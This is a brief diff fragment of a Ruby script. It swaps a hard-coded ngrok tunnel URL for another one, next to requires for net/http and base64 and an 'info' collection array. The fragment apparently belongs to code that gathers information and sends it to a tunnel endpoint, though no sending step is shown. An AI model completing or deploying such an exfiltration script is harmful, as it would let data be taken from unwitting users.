@@ -2,7 +2,7 @@ require 'net/http'
 require 'uri'
 require 'base64'
 
-NGROK = 'https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app'
+NGROK = 'https://9304-84-30-51-191.ngrok-free.app'
 
 begin
   info = []
